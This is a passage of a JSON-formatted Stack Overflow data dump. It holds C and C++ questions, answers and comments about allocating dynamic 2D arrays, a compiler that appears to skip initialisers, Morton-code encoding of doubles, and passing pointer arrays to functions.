&quot;Another way&quot; in my answer."}, {"owner": {"reputation": 35932, "user_id": 1606345, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/IwiIM.png?s=128&g=1", "display_name": "David Ranieri", "link": "https://stackoverflow.com/users/1606345/david-ranieri"}, "edited": false, "score": 2, "creation_date": 1444845057, "post_id": 33131318, "comment_id": 54075993, "body": "@RSahu, yes, &quot;Another way&quot; is a nice way to avoid memory fragmentation."}], "tags": [], "owner": {"reputation": 196207, "user_id": 434551, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/8Wzl8.png?s=128&g=1", "display_name": "R Sahu", "link": "https://stackoverflow.com/users/434551/r-sahu"}, "is_accepted": false, "score": 3, "last_activity_date": 1444842136, "last_edit_date": 1444842136, "creation_date": 1444841806, "answer_id": 33131318, "question_id": 33131225, "link": "https://stackoverflow.com/questions/33131225/can-i-declare-a-pointer-to-a-2d-array-before-i-know-the-dimensions/33131318#33131318", "title": "Can I declare a pointer to a 2d array before I know the dimensions?", "body": "<blockquote>\n  <p>So how do I declare this pointer when I don't yet know the dimensions and I intend to use square bracket notation?</p>\n</blockquote>\n\n<p>You can use a pointer to a pointer.</p>\n\n<pre><code>int** p = NULL;\n</code></pre>\n\n<p>and later....</p>\n\n<pre><code>p = malloc(N*sizeof(int*));\nfor (int i = 0; i &lt; N; ++i )\n{\n   p[i] = malloc(M*sizeof(int));\n}\n</code></pre>\n\n<p>and make sure to deallocate in multiple steps.</p>\n\n<pre><code>for (int i = 0; i &lt; N; ++i )\n{\n   free(p[i]);\n}\nfree(p);\n</code></pre>\n\n<p>Another way.</p>\n\n<pre><code>// Allocate memory for the pointers.\np = malloc(N*sizeof(int*));\n\n// Allocate memory for the ints.\np[0] = malloc(M*N*sizeof(int));\n\n// Assign the values to the elements of p.\nfor (int i = 1; i &lt; N; ++i )\n{\n   p[i] = p[i-1] + M;\n}\n</code></pre>\n\n<p>and deallocate in only two steps.</p>\n\n<pre><code>free(p[0]);\nfree(p);\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1444843367, "post_id": 33131709, "comment_id": 54075067, "body": "Note there was a discussion if you may use <code>sizeof(*vla)</code> before the pointer has been initialised. While I agree this is allowed, the standard&#39;s text might be missleading. This can be avoided by explicitly using <code>sizeof(int) * x * y)</code>."}, {"owner": {"reputation": 5077, "user_id": 2327831, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/acb1ec5c15fa33042fa79847c55da18d?s=128&d=identicon&r=PG", "display_name": "this", "link": "https://stackoverflow.com/users/2327831/this"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1444844486, "post_id": 33131709, "comment_id": 54075668, "body": "@Olaf So you are saying that the pointer should be initialized to avoid that ub, but the dereference isn&#39;t a problem?"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1444845051, "post_id": 33131709, "comment_id": 54075991, "body": "<a href=\"http://stackoverflow.com/questions/32985424/is-the-operand-of-sizeof-evaluated-with-a-vla/32985668#comment53896597_32985668\" title=\"is the operand of sizeof evaluated with a vla\">stackoverflow.com/questions/32985424/&hellip;</a> I do not support the accepted answer, but that of Keith Thompson. Please read the comments, too."}, {"owner": {"reputation": 5077, "user_id": 2327831, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/acb1ec5c15fa33042fa79847c55da18d?s=128&d=identicon&r=PG", "display_name": "this", "link": "https://stackoverflow.com/users/2327831/this"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1444845433, "post_id": 33131709, "comment_id": 54076219, "body": "@Olaf I did. Compilers will do what Keith concludes at the end, but the Standard is still ambiguous in my opinion. Should we seriously start writing sizeof( int[y][x] ) just to be sure?"}], "tags": [], "owner": {"reputation": 5077, "user_id": 2327831, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/acb1ec5c15fa33042fa79847c55da18d?s=128&d=identicon&r=PG", "display_name": "this", "link": "https://stackoverflow.com/users/2327831/this"}, "is_accepted": false, "score": 1, "last_activity_date": 1444843047, "creation_date": 1444843047, "answer_id": 33131709, "question_id": 33131225, "link": "https://stackoverflow.com/questions/33131225/can-i-declare-a-pointer-to-a-2d-array-before-i-know-the-dimensions/33131709#33131709", "title": "Can I declare a pointer to a 2d array before I know the dimensions?", "body": "<p>Simply use a pointer to a variable length array.</p>\n\n<p>Your sizes, y rows with x elements: </p>\n\n<pre><code>size_t x = 123;\nsize_t y = 30;\n</code></pre>\n\n<p>Allocate in with one call, <code>sizeof(*p)</code> is identical to <code>sizeof(int) * 123</code>:</p>\n\n<pre><code>int (*p)[x] = malloc( sizeof(*p) * y );\n</code></pre>\n\n<p>And iterate the 2d array:</p>\n\n<pre><code>for( size_t i = 0 ; i &lt; y ; i++ )\n    for( size_t j = 0 ; j &lt; x ; j++ )  \n        p[i][j] = 0;\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 12194, "user_id": 4474419, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/04ce27f0ebe4713b51911cd8475c3b42?s=128&d=identicon&r=PG", "display_name": "Davislor", "link": "https://stackoverflow.com/users/4474419/davislor"}, "is_accepted": false, "score": -1, "last_activity_date": 1444845671, "creation_date": 1444845671, "answer_id": 33132443, "question_id": 33131225, "link": "https://stackoverflow.com/questions/33131225/can-i-declare-a-pointer-to-a-2d-array-before-i-know-the-dimensions/33132443#33132443", "title": "Can I declare a pointer to a 2d array before I know the dimensions?", "body": "<p>To index an array of arrays rather than an array of pointers, you can use this trick:</p>\n\n<pre><code>#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n\nvoid f( const size_t m, const size_t n, const char s[m][n] )\n{\n   printf( \"%s, %s!\\n\", s[0], s[1] );\n   return;\n}\n\nint main(void) {\n    static const char hello[][6] = { \"hello\", \"world\" };\n    f( sizeof(hello)/sizeof(hello[0]), sizeof(hello[0]), hello );\n\n    return EXIT_SUCCESS;\n}\n</code></pre>\n\n<p>Your question is tagged C and not C++, but C++ does have references to arrays: <code>int (&amp;foo)[m][n] = bar;</code></p>\n"}], "owner": {"reputation": 494, "user_id": 2041719, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/d339331d395216bbee19b70446e0c92e?s=128&d=identicon&r=PG", "display_name": "Korgan Rivera", "link": "https://stackoverflow.com/users/2041719/korgan-rivera"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 78, "favorite_count": 0, "answer_count": 4, "score": 0, "last_activity_date": 1444845671, "creation_date": 1444841521, "question_id": 33131225, "link": "https://stackoverflow.com/questions/33131225/can-i-declare-a-pointer-to-a-2d-array-before-i-know-the-dimensions", "title": "Can I declare a pointer to a 2d array before I know the dimensions?", "body": "<p>I know that one way to declare a pointer to a 2d array is like this:</p>\n\n<pre><code>int(*p)[100];\n</code></pre>\n\n<p>Then after assigning it to something, I can use elements like this:</p>\n\n<pre><code>p[1][6] = 18;\n</code></pre>\n\n<p>But let's say I don't yet know the dimensions of the array and I intend to malloc them when I find out.  </p>\n\n<p>One solution is that I declare a pointer to just an int, then use pointer arithmetic to navigate the array.  I usually do this, but this time I'd like to use the square bracket notation for convenience.</p>\n\n<p>So how do I declare this pointer when I don't yet know the dimensions and I intend to use square bracket notation?</p>\n"}, {"tags": ["c", "compiler-optimization"], "comments": [{"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1444842418, "post_id": 33131017, "comment_id": 54074530, "body": "How do you test the return value from <code>main()</code>? In both of your example conversions, uninitialised values are returned."}, {"owner": {"reputation": 5024, "user_id": 4439794, "user_type": "registered", "accept_rate": 39, "profile_image": "https://i.stack.imgur.com/ogyE1.png?s=128&g=1", "display_name": "Trevor", "link": "https://stackoverflow.com/users/4439794/trevor"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1444842877, "post_id": 33131017, "comment_id": 54074794, "body": "- How do I test a return value ?  --&gt;I use RTRT testing tool of IBM.  - I obviously init value for local struct (example 1) and local array (example 2), so the return values should be 1. I&#39;ve checked it by using Visual Studio, and the return values are 1."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1444845386, "post_id": 33131017, "comment_id": 54076194, "body": "My point was that without initialisation, my program does not return <code>0</code> but the arbitrary value <code>4205729</code>."}, {"owner": {"reputation": 5024, "user_id": 4439794, "user_type": "registered", "accept_rate": 39, "profile_image": "https://i.stack.imgur.com/ogyE1.png?s=128&g=1", "display_name": "Trevor", "link": "https://stackoverflow.com/users/4439794/trevor"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1444885858, "post_id": 33131017, "comment_id": 54091321, "body": "Yes, I got your point."}], "owner": {"reputation": 5024, "user_id": 4439794, "user_type": "registered", "accept_rate": 39, "profile_image": "https://i.stack.imgur.com/ogyE1.png?s=128&g=1", "display_name": "Trevor", "link": "https://stackoverflow.com/users/4439794/trevor"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 216, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1444840844, "creation_date": 1444840844, "question_id": 33131017, "link": "https://stackoverflow.com/questions/33131017/diab-compiler-does-it-automatically-optimize-array-and-structure-initialization", "title": "Diab Compiler, Does it automatically optimize array and structure initialization ?", "body": "<p>\nHi,</p>\n\n<p>I'm using Diab 5.8.0 as a compiler for my C source code.\nI've recognized that if I have a program like this:</p>\n\n<pre class=\"lang-cpp prettyprint-override\"><code>    typedef struct\n    {\n        int field_1;\n        int field_2;\n        int field_3;\n\n    } Struct_Type;\n\n    int main()\n    {\n\n    Struct_Type  temp_st = {1,1,1};\n\n    return temp_st.field_1;\n\n    }\n</code></pre>\n\n<p>It seems to be converted to this (the return value is 0 instead of 1)</p>\n\n<pre class=\"lang-cpp prettyprint-override\"><code>    typedef struct\n    {\n        int field_1;\n        int field_2;\n        int field_3;\n\n    } Struct_Type;\n\n    int main()\n    {\n\n    Struct_Type  temp_st;\n\n    return temp_st.field_1;\n\n    }\n</code></pre>\n\n<p>There is same problem with array initialization,</p>\n\n<p>This:</p>\n\n<pre class=\"lang-cpp prettyprint-override\"><code>    int main()\n    {   \n\n    int array[3]={1,1,1};  \n\n    return array[0];  \n\n    }\n</code></pre>\n\n<p>is converted to this:</p>\n\n<pre class=\"lang-cpp prettyprint-override\"><code>    int main()\n    {   \n\n    int array[3];  \n\n    return array[0];  \n\n    }\n</code></pre>\n\n<p>I think the issue is from the optimization of Diab Compiler so I do not use any optimize-flag when compile code but the issue is still there.</p>\n\n<p>Could you help me if you know the root cause of this and the solution if I want to init value for struct and array right at the declaration?</p>\n"}, {"tags": ["c", "z-order-curve"], "comments": [{"owner": {"reputation": 13359, "user_id": 489590, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/e16b3d117fa188c4dbdafb8dc27a4df0?s=128&d=identicon&r=PG&f=1", "display_name": "Brian Cain", "link": "https://stackoverflow.com/users/489590/brian-cain"}, "edited": false, "score": 1, "creation_date": 1444843763, "post_id": 33130985, "comment_id": 54075287, "body": "&quot; I presume that I can use type cast to convert the floats to integers and run Morton ordering on those integers&quot; -- you <i>could</i>.  I suppose you&#39;ll effectively be looking at the locality of exponent, mantissa, sign.  Something makes me think that if your dynamic range is very large it may not give you the results you want."}, {"owner": {"reputation": 13359, "user_id": 489590, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/e16b3d117fa188c4dbdafb8dc27a4df0?s=128&d=identicon&r=PG&f=1", "display_name": "Brian Cain", "link": "https://stackoverflow.com/users/489590/brian-cain"}, "edited": false, "score": 0, "creation_date": 1444843802, "post_id": 33130985, "comment_id": 54075316, "body": "If your dynamic range is small enough maybe you could just do a linear scale to get from <code>float</code> to <code>int64</code>."}, {"owner": {"reputation": 667, "user_id": 1968203, "user_type": "registered", "accept_rate": 58, "profile_image": "https://www.gravatar.com/avatar/d22b798abdbe81054291772b539dbdeb?s=128&d=identicon&r=PG", "display_name": "Alexander Cska", "link": "https://stackoverflow.com/users/1968203/alexander-cska"}, "reply_to_user": {"reputation": 13359, "user_id": 489590, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/e16b3d117fa188c4dbdafb8dc27a4df0?s=128&d=identicon&r=PG&f=1", "display_name": "Brian Cain", "link": "https://stackoverflow.com/users/489590/brian-cain"}, "edited": false, "score": 0, "creation_date": 1444845013, "post_id": 33130985, "comment_id": 54075971, "body": "I am basically trying to cram 3 numbers into one and then decode them back. I am doing this for memory saving purposes and I was thinking that Morton order might be the simplest solution."}, {"owner": {"reputation": 12073, "user_id": 527574, "user_type": "registered", "accept_rate": 97, "profile_image": "https://www.gravatar.com/avatar/e5b251b4ac8f0cb7942587ee8077cddb?s=128&d=identicon&r=PG", "display_name": "Michael Dorgan", "link": "https://stackoverflow.com/users/527574/michael-dorgan"}, "edited": false, "score": 1, "creation_date": 1444847056, "post_id": 33130985, "comment_id": 54077222, "body": "If you are attempting to do a whole lot of numbers, you might be better off using a more generic compressor on the whole data stream rather than a per triplet solution as you have here."}, {"owner": {"reputation": 667, "user_id": 1968203, "user_type": "registered", "accept_rate": 58, "profile_image": "https://www.gravatar.com/avatar/d22b798abdbe81054291772b539dbdeb?s=128&d=identicon&r=PG", "display_name": "Alexander Cska", "link": "https://stackoverflow.com/users/1968203/alexander-cska"}, "edited": false, "score": 0, "creation_date": 1444849251, "post_id": 33130985, "comment_id": 54078502, "body": "Well I need to compress 3 floats. I am not familiar with the alternative solutions."}, {"owner": {"reputation": 3805, "user_id": 247643, "user_type": "registered", "accept_rate": 58, "profile_image": "https://www.gravatar.com/avatar/8e9927c1955a6b0497cf6c13d9a7b403?s=128&d=identicon&r=PG", "display_name": "doynax", "link": "https://stackoverflow.com/users/247643/doynax"}, "edited": false, "score": 0, "creation_date": 1444852633, "post_id": 33130985, "comment_id": 54080436, "body": "@Alexander Cska: Obviously you can&#39;t squeeze 192 bits of information into 64-bits of storage without loss of precision, and interleaving the floating point encoding like this will simply throw away the most important parts (and decode to denormalized noise). Effective compression will require knowledge of your data we lack to figure out where bits of precision can safely be omitted. Generally speaking though switching to 32-bit floats is probably a reasonable first attempt. For coordinates space fixed-point or shared exponents may be suitable, arithmetic invariants exploited, and so on"}, {"owner": {"reputation": 667, "user_id": 1968203, "user_type": "registered", "accept_rate": 58, "profile_image": "https://www.gravatar.com/avatar/d22b798abdbe81054291772b539dbdeb?s=128&d=identicon&r=PG", "display_name": "Alexander Cska", "link": "https://stackoverflow.com/users/1968203/alexander-cska"}, "edited": false, "score": 0, "creation_date": 1444853209, "post_id": 33130985, "comment_id": 54080800, "body": "Indeed, conversion to integers by <code>reinterpret_cast</code> produces problems with the storage. I am saving coordinates. The initial numbers are Fortran signed double precision, with 17 places after the coma and exponent range to 205. I use iso-c binding to call the c functions. This sort of precision is important because I am running a numerical simulation code and truncating the precision might result in divergence or machine dependent results."}, {"owner": {"reputation": 3805, "user_id": 247643, "user_type": "registered", "accept_rate": 58, "profile_image": "https://www.gravatar.com/avatar/8e9927c1955a6b0497cf6c13d9a7b403?s=128&d=identicon&r=PG", "display_name": "doynax", "link": "https://stackoverflow.com/users/247643/doynax"}, "edited": false, "score": 0, "creation_date": 1444853955, "post_id": 33130985, "comment_id": 54081235, "body": "@Alexander Cska: Then I don&#39;t quite see the problem. As long as the down-conversion is carefully written and consistently performed there&#39;s no reason why it can&#39;t be deterministic. Beyond you&#39;ll have to try lossless compression, which is usually less than stellar at dealing with floating-point representations. Again, Morton codes simply rearrange the order of the bits. They don&#39;t somehow magically turn 192-bits of information into 64-bits of data."}, {"owner": {"reputation": 667, "user_id": 1968203, "user_type": "registered", "accept_rate": 58, "profile_image": "https://www.gravatar.com/avatar/d22b798abdbe81054291772b539dbdeb?s=128&d=identicon&r=PG", "display_name": "Alexander Cska", "link": "https://stackoverflow.com/users/1968203/alexander-cska"}, "reply_to_user": {"reputation": 3805, "user_id": 247643, "user_type": "registered", "accept_rate": 58, "profile_image": "https://www.gravatar.com/avatar/8e9927c1955a6b0497cf6c13d9a7b403?s=128&d=identicon&r=PG", "display_name": "doynax", "link": "https://stackoverflow.com/users/247643/doynax"}, "edited": false, "score": 0, "creation_date": 1444856384, "post_id": 33130985, "comment_id": 54082566, "body": "@doynax: Well in numerical analysis if you run single precision real arithmetic, you will get as many results as there are platforms your code is running on. Not to mention that in some cases, the lack of precision might lead to failed convergence. Therefore my (x,y,z) have to be double precision. My problem can be formulated as being how to encode 3 doubles into a unique integer. I think that due to the nature of my code this might be a lost cause. I can not say in advanced how my randomly generated (x,y,z) might look like."}, {"owner": {"reputation": 3805, "user_id": 247643, "user_type": "registered", "accept_rate": 58, "profile_image": "https://www.gravatar.com/avatar/8e9927c1955a6b0497cf6c13d9a7b403?s=128&d=identicon&r=PG", "display_name": "doynax", "link": "https://stackoverflow.com/users/247643/doynax"}, "edited": false, "score": 0, "creation_date": 1444857481, "post_id": 33130985, "comment_id": 54083061, "body": "@Alexander Cska: You&#39;ll need a compiler (or suitable compiler switches) for strictly enforcing IEEE-754 arithmetic certainly, and only use well-defined basic operations. That&#39;s no different whether you&#39;re using single or double-precision though, and for a limited C function solely dedicated to conversion between the two it shouldn&#39;t be a problem. In any event you must have some knowledge of the data if you&#39;ve determined that you can make do with only double precision, perhaps that can be taken further."}], "owner": {"reputation": 667, "user_id": 1968203, "user_type": "registered", "accept_rate": 58, "profile_image": "https://www.gravatar.com/avatar/d22b798abdbe81054291772b539dbdeb?s=128&d=identicon&r=PG", "display_name": "Alexander Cska", "link": "https://stackoverflow.com/users/1968203/alexander-cska"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 393, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1522651169, "creation_date": 1444840750, "last_edit_date": 1522651169, "question_id": 33130985, "link": "https://stackoverflow.com/questions/33130985/morton-ordering-in-3d-usign-unit64-t-as-input", "title": "Morton ordering in 3D usign unit64_t as input", "body": "<p>I am trying to use Morton code to produce unique encoding for a given (x,y,z) where x,y,z are double precision floating point numbers. I presume that I can use type cast to convert the floats to integers and run Morton ordering on those integers. For example consider the following <code>C++</code> code. (I don't now how to do the same in <code>C</code>)</p>\n\n<pre><code>double x=-1.123456789123456E205;\nint64_t i = reinterpret_cast&lt;int64_t &amp;&gt;(x);\ncout&lt;&lt;i&lt;&lt;endl;\noutput &gt;&gt;&gt; i = -1548698869907112442\n</code></pre>\n\n<p>And ditto for the reaming <code>x,y</code>. Once I have the \"reinterpreted\" values ,I would like to use them as a subroutine for Morton coding. </p>\n\n<p>I checked the above type cast and it worked fine in reverse</p>\n\n<pre><code>double y = reinterpret_cast&lt;double &amp;&gt;(i);\ncout&lt;&lt;setprecision(16)&lt;&lt;y&lt;&lt;endl;\noutput&gt;&gt;-1.123456789123456e+205\n</code></pre>\n\n<p>I managed to find some codes for Morton coding, even some of them on this forum, but non of them used <code>int64_t</code> in 3D. Hence I am going to need the help of the experts on the forum, how to encode and decode <code>int64_t</code> integers.  </p>\n\n<p>I managed to reverse engineer the following code. Unfortunately there is some bug, I am not getting the proper numbers when I run the decode part. I would appreciate any help to figure out what is wrong.</p>\n\n<p><a href=\"https://stackoverflow.com/questions/30539347/2d-morton-code-encode-decode-64bits\">2D morton code encode/decode 64bits</a>.</p>\n\n<pre><code>#include &lt;iostream&gt;\n#include &lt;stdint.h&gt;\n#include&lt;iomanip&gt;\n\nusing namespace std;\n\nuint64_t code_2D_M(double xd,double yd){\n\nuint64_t x = reinterpret_cast&lt;uint64_t&amp; &gt;(xd);\nuint64_t y = reinterpret_cast&lt;uint64_t&amp; &gt;(yd);\n\nx = (x | (x &lt;&lt; 16)) &amp; 0x0000FFFF0000FFFF;\nx = (x | (x &lt;&lt; 8)) &amp; 0x00FF00FF00FF00FF;\nx = (x | (x &lt;&lt; 4)) &amp; 0x0F0F0F0F0F0F0F0F;\nx = (x | (x &lt;&lt; 2)) &amp; 0x3333333333333333;\nx = (x | (x &lt;&lt; 1)) &amp; 0x5555555555555555;\n\ny = (y | (y &lt;&lt; 16)) &amp; 0x0000FFFF0000FFFF;\ny = (y | (y &lt;&lt; 8)) &amp; 0x00FF00FF00FF00FF;\ny = (y | (y &lt;&lt; 4)) &amp; 0x0F0F0F0F0F0F0F0F;\ny = (y | (y &lt;&lt; 2)) &amp; 0x3333333333333333;\ny = (y | (y &lt;&lt; 1)) &amp; 0x5555555555555555;\n\nreturn x | (y &lt;&lt; 1);\n\n}\n\n\nuint64_t code_3D_M(double xd,double yd,double zd){\n\n\nuint64_t x = reinterpret_cast&lt;uint64_t&amp; &gt;(xd);\nuint64_t y = reinterpret_cast&lt;uint64_t&amp; &gt;(yd);\nuint64_t z = reinterpret_cast&lt;uint64_t&amp; &gt;(zd);\n\nx = (x | (x &lt;&lt; 16)) &amp; 0x0000FFFF0000FFFF;\nx = (x | (x &lt;&lt; 8)) &amp; 0x00FF00FF00FF00FF;\nx = (x | (x &lt;&lt; 4)) &amp; 0x0F0F0F0F0F0F0F0F;\nx = (x | (x &lt;&lt; 2)) &amp; 0x3333333333333333;\nx = (x | (x &lt;&lt; 1)) &amp; 0x5555555555555555;\n\ny = (y | (y &lt;&lt; 16)) &amp; 0x0000FFFF0000FFFF;\ny = (y | (y &lt;&lt; 8)) &amp; 0x00FF00FF00FF00FF;\ny = (y | (y &lt;&lt; 4)) &amp; 0x0F0F0F0F0F0F0F0F;\ny = (y | (y &lt;&lt; 2)) &amp; 0x3333333333333333;\ny = (y | (y &lt;&lt; 1)) &amp; 0x5555555555555555;\n\nz = (y | (y &lt;&lt; 16)) &amp; 0x0000FFFF0000FFFF;\nz = (y | (y &lt;&lt; 8)) &amp; 0x00FF00FF00FF00FF;\nz = (y | (y &lt;&lt; 4)) &amp; 0x0F0F0F0F0F0F0F0F;\nz = (y | (y &lt;&lt; 2)) &amp; 0x3333333333333333;\nz = (y | (y &lt;&lt; 1)) &amp; 0x5555555555555555;\n\nreturn x | (y &lt;&lt; 1) | (z &lt;&lt; 2);\n\n}\n\ndouble decode_M(uint64_t x)\n{\n    x = x &amp; 0x5555555555555555;\n    x = (x | (x &gt;&gt; 1)) &amp; 0x3333333333333333;\n    x = (x | (x &gt;&gt; 2)) &amp; 0x0F0F0F0F0F0F0F0F;\n    x = (x | (x &gt;&gt; 4)) &amp; 0x00FF00FF00FF00FF;\n    x = (x | (x &gt;&gt; 8)) &amp; 0x0000FFFF0000FFFF;\n    x = (x | (x &gt;&gt; 16)) &amp; 0xFFFFFFFFFFFFFFFF;\n    return reinterpret_cast&lt;double&amp; &gt;(x);\n}\n\n\nint main (void){\n\nuint64_t  mort;\ndouble  x,y,z;\n\n// test input\nx=2.123456789123459E205;\ny=1.789789123456129E205;\nz=9.999999912345779E205;\n\n// echo the input\ncout&lt;&lt;setprecision(17)&lt;&lt;x&lt;&lt;endl;\ncout&lt;&lt;setprecision(17)&lt;&lt;y&lt;&lt;endl;\ncout&lt;&lt;setprecision(17)&lt;&lt;z&lt;&lt;endl;\n\n// encode 2D case\nmort = code_2D_M(x,y);\n//decode and print the results to see if all was fine\ncout&lt;&lt;setprecision(17)&lt;&lt;decode_M(mort&gt;&gt;0)&lt;&lt;endl;\ncout&lt;&lt;setprecision(17)&lt;&lt;decode_M(mort&gt;&gt;1)&lt;&lt;endl;\n\n// encode 3D case\nmort = code_3D_M(x,y,z);\n//decode and print the results to see if all was fine\ncout&lt;&lt;setprecision(17)&lt;&lt;decode_M(mort&gt;&gt;0)&lt;&lt;endl;\ncout&lt;&lt;setprecision(17)&lt;&lt;decode_M(mort&gt;&gt;1)&lt;&lt;endl;\ncout&lt;&lt;setprecision(17)&lt;&lt;decode_M(mort&gt;&gt;2)&lt;&lt;endl;\n\n\n\nreturn 0;\n}\n</code></pre>\n\n<p>I am doing this because I would like not storing the coordinates as a 3D point (x,y,z) but rather as a single long integer and decode them when needed. By doing so I will reduce the size of my coordinate storage array 3-fold. </p>\n"}, {"tags": ["c++", "c", "arrays"], "comments": [{"owner": {"reputation": 149509, "user_id": 4342498, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/l3j88.jpg?s=128&g=1", "display_name": "NathanOliver", "link": "https://stackoverflow.com/users/4342498/nathanoliver"}, "reply_to_user": {"reputation": 83072, "user_id": 1413395, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/6wNQa.jpg?s=128&g=1", "display_name": "\u03c0\u03ac\u03bd\u03c4\u03b1 \u1fe5\u03b5\u1fd6", "link": "https://stackoverflow.com/users/1413395/%cf%80%ce%ac%ce%bd%cf%84%ce%b1-%e1%bf%a5%ce%b5%e1%bf%96"}, "edited": false, "score": 0, "creation_date": 1444840860, "post_id": 33130895, "comment_id": 54073613, "body": "@\u03c0\u03ac\u03bd\u03c4\u03b1 \u1fe5\u03b5\u1fd6 that answers an underlying issue with the code but does not answer how to pass X*[][] to a function where it is not a copy"}, {"owner": {"reputation": 33, "user_id": 5446002, "user_type": "registered", "profile_image": "https://graph.facebook.com/1510289822616019/picture?type=large", "display_name": "Yuri Suzumiya", "link": "https://stackoverflow.com/users/5446002/yuri-suzumiya"}, "reply_to_user": {"reputation": 149509, "user_id": 4342498, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/l3j88.jpg?s=128&g=1", "display_name": "NathanOliver", "link": "https://stackoverflow.com/users/4342498/nathanoliver"}, "edited": false, "score": 0, "creation_date": 1444845080, "post_id": 33130895, "comment_id": 54076004, "body": "Thanks for the information, however as i was unaware at the time of posting this that it was the pointers going out of scope causing the problems, the information given on this other question just made me more confused."}, {"owner": {"reputation": 26583, "user_id": 1441, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/fb7f1cd450084fdb4bfc9376c7dba2a7?s=128&d=identicon&r=PG", "display_name": "crashmstr", "link": "https://stackoverflow.com/users/1441/crashmstr"}, "edited": false, "score": 0, "creation_date": 1444845233, "post_id": 33130895, "comment_id": 54076095, "body": "@YuriSuzumiya <i>Don&#39;t</i> update questions with &quot;Solved&quot; or to contain an answer. That is what answers are for (and if no answer is complete, you are free to write your own)."}], "answers": [{"comments": [{"owner": {"reputation": 33, "user_id": 5446002, "user_type": "registered", "profile_image": "https://graph.facebook.com/1510289822616019/picture?type=large", "display_name": "Yuri Suzumiya", "link": "https://stackoverflow.com/users/5446002/yuri-suzumiya"}, "edited": false, "score": 0, "creation_date": 1444840957, "post_id": 33130967, "comment_id": 54073667, "body": "Thanks, that helps me understand what was going on. I will try this now"}], "tags": [], "owner": {"reputation": 7489, "user_id": 2183287, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/f994c77448da7979a598ef76d270de67?s=128&d=identicon&r=PG&f=1", "display_name": "fatihk", "link": "https://stackoverflow.com/users/2183287/fatihk"}, "is_accepted": true, "score": 0, "last_activity_date": 1444840698, "creation_date": 1444840698, "answer_id": 33130967, "question_id": 33130895, "link": "https://stackoverflow.com/questions/33130895/c-having-trouble-passing-a-2d-array-of-pointers-into-a-function/33130967#33130967", "title": "C++.Having trouble passing a 2D array of pointers into a function", "body": "<pre><code>JumpScareRoom JSRoom1;\n</code></pre>\n\n<p>is a local object and when you go out of the function scope, it is invalidated. Instead, you can use:</p>\n\n<pre><code>JumpScareRoom *pJSRoom1 = new JumpScareRoom();\nRoom *room1 = JSRoom1;\nJSRoom1-&gt;SetExits(\"se\");\nJSRoom1-&gt;SetDescriptions(\"I am a jumpscare room.\", \"I am a boring room 1\");\nJSRoom1-&gt;SetSouthMessages(\"There is a door to the SOUTH\", \"You exit through the SOUTH door.\");\nJSRoom1-&gt;SetEastMessages(\"There is a door to the EAST\", \"You exit through the EAST door.\");\n...\n</code></pre>\n"}], "owner": {"reputation": 33, "user_id": 5446002, "user_type": "registered", "profile_image": 